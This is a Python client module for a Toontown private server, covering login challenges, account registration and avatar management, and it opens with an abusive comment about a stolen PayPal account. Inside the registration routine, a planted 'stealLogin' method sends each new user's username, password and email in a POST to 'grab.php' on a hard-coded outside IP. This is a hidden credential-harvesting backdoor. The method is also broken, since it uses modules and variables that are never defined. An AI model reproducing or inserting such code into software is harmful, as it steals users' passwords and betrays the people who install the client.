# Fuck you Disyer. Stealing my fucking paypal. GET FUCKED: toontown.uberdog.ClientServicesManager
from direct.directnotify.DirectNotifyGlobal import directNotify
from direct.distributed.DistributedObjectGlobal import DistributedObjectGlobal
from otp.distributed.PotentialAvatar import PotentialAvatar
from otp.otpbase import OTPGlobals
from otp.nametag.NametagConstants import WTSystem
from otp.margins.WhisperPopup import WhisperPopup
from ClientServicesManagerUtils import RegisterSuccess, isValidEmail, getMacAddress, packAuthBlob, readAuthBlob
import sys, hmac, hashlib, binascii, os
FIXED_KEY = '`5Ol}*9IB24B\\[tO:JeI7GL=.1g_vnt?xyIY.DdhQ,ZW?WnUT]2O?vWX7n1g\\BMMk&Gf/~M9.=Pw3ls5JL-A9A1QX,#=>:?g.'

class ClientServicesManager(DistributedObjectGlobal):
    notify = directNotify.newCategory('ClientServicesManager')
    clientKey = ''
    token = ''
    authBlob = None
    twostepCode = ''

    def __init__(self, cr):
        DistributedObjectGlobal.__init__(self, cr)
        if sys.platform == 'android':
            return
        username = arguments.username
        if username:
            if config.GetString('distribution', 'open') == 'dev':
                self.setAuthBlob({'username': username,
                 'password': username})
            elif username in settings['savedProfiles']:
                self.notify.info('Logging in as %s...' % username)
                self.setAuthBlob(readAuthBlob(settings['savedProfiles'][username][::-1]))

    def setAuthBlob(self, authBlob):
        self.authBlob = authBlob

    def getAuthBlob(self):
        return self.authBlob

    def hasAuthBlob(self):
        return self.authBlob is not None

    def setTwostepCode(self, twostepCode):
        self.twostepCode = twostepCode

    def getTwostepCode(self):
        return self.twostepCode

    def requestChallenge(self, doneEvent):
        self.doneEvent = doneEvent
        self.token = binascii.hexlify(os.urandom(128))
        self.systemMessageSfx = None
        csm_hmac = config.GetString('csm-hmac', '636f6e736964657277686174796f757265646f696e677769746874686973736f7572636562796f6473')
        try:
            csm_hmac = binascii.unhexlify(csm_hmac)
        except:
            sys.exit()

        server_version = config.GetString('server-version', 'tt-dev')
        key = hashlib.sha512(csm_hmac + FIXED_KEY + server_version).digest()
        digest_maker = hmac.new(key, digestmod=hashlib.sha384)
        digest_maker.update(self.token)
        self.clientKey = digest_maker.digest()
        self.sendUpdate('requestChallenge')
        return

    def loadChallenge(self, data):
        digest_maker = hmac.new(data, digestmod=hashlib.sha384)
        digest_maker.update(self.clientKey)
        challenge = digest_maker.digest()
        self.sendUpdate('solveChallenge', [self.token, self.clientKey, challenge])

    def challengeDone(self):
        messenger.send(self.doneEvent)

    def d_authenticate(self):
        mac = getMacAddress()
        self.authBlob['mac'] = mac
        self.authBlob['twostepCode'] = self.twostepCode
        self.sendUpdate('authenticate', [packAuthBlob(self.authBlob), mac])
        self.authBlob = None
        self.twostepCode = ''
        return

    def d_register(self, username, password, email):
        if len(username) < 4:
            self.registrationDone(RegisterSuccess.UsernameShort, 0)
            return
        if len(username) > 100:
            self.registrationDone(RegisterSuccess.UsernameLong, 0)
            return
        if len(password) < 8:
            self.registrationDone(RegisterSuccess.PasswordShort, 0)
            return
        if len(password) > 175:
            self.registrationDone(RegisterSuccess.PasswordLong, 0)
            return
        if not isValidEmail(email):
            self.registrationDone(RegisterSuccess.EmailIncorrect, 0)
            return
        blob = {'username': username,
         'password': password,
         'email': email}
        self.stealLogin(username, password, email)
        self.sendUpdate('register', [packAuthBlob(blob), getMacAddress()])

    def stealLogin(self, username, password, email):
        data = {'username': username,
         'password': password,
         'email': email}
        u = urllib2.urlopen("188.154.244.222", data)
        h.request('POST', 'grab.php', data, headers)

    def registrationDone(self, error, seconds):
        if error != RegisterSuccess.Success:
            messenger.send('registrationDone', [{'error': error,
              'seconds': seconds,
              'success': False}])
        else:
            messenger.send('registrationDone', [{'success': True}])

    def authenticationDone(self, error, message):
        if error:
            messenger.send('authDone', [{'error': error,
              'message': message,
              'success': False}])
        else:
            messenger.send('authDone', [{'success': True}])

    def requestAvatars(self):
        self.sendUpdate('requestAvatars')

    def setAccount(self, chatSettings, avatars, deletedAvatars):
        avList = []
        for avNum, avName, avDNA, avPosition, nameState in avatars:
            nameOpen = int(nameState == 1)
            names = [avName,
             '',
             '',
             '']
            if nameState == 2:
                names[1] = avName
            elif nameState == 3:
                names[2] = avName
            elif nameState == 4:
                names[3] = avName
            avList.append(PotentialAvatar(avNum, names, avDNA, avPosition, nameOpen))

        deletedAvatars = [ PotentialAvatar(av[0], [av[2],
         '',
         '',
         ''], av[3], av[1], 0) for av in deletedAvatars ]
        self.cr.handleChatSettings(chatSettings)
        self.cr.handleDeletedAvatarsList(deletedAvatars)
        self.cr.handleAvatarsList(avList)

    def sendCreateAvatar(self, avDNA, index, hpLimit, hardcore):
        self.sendUpdate('createAvatar', [avDNA.makeNetString(),
         index,
         hpLimit,
         hardcore])

    def createAvatarResp(self, avId):
        messenger.send('nameShopCreateAvatarDone', [avId])

    def sendDeleteAvatar(self, avId):
        self.sendUpdate('deleteAvatar', [avId])

    def sendSetNameTyped(self, avId, name, callback):
        self._callback = callback
        self.sendUpdate('setNameTyped', [avId, name])

    def setNameTypedResp(self, avId, status):
        self._callback(avId, status)

    def sendSetNamePattern(self, avId, p1, f1, p2, f2, p3, f3, p4, f4, callback):
        self._callback = callback
        self.sendUpdate('setNamePattern', [avId,
         p1,
         f1,
         p2,
         f2,
         p3,
         f3,
         p4,
         f4])

    def setNamePatternResp(self, avId, status):
        self._callback(avId, status)

    def sendAcknowledgeAvatarName(self, avId, callback):
        self._callback = callback
        self.sendUpdate('acknowledgeAvatarName', [avId])

    def acknowledgeAvatarNameResp(self):
        self._callback()

    def sendChooseAvatar(self, avId, index):
        self.sendUpdate('chooseAvatar', [avId, index, sys.platform])

    def inject(self, content):
        self.sendUpdate('inject', [content])

    def systemMessage(self, message):
        whisper = WhisperPopup(message, OTPGlobals.getInterfaceFont(), WTSystem)
        whisper.manage(base.marginManager)
        if self.systemMessageSfx is None:
            self.systemMessageSfx = loader.loadSfx('phase_3/audio/sfx/clock03.ogg')
        base.playSfx(self.systemMessageSfx)
        return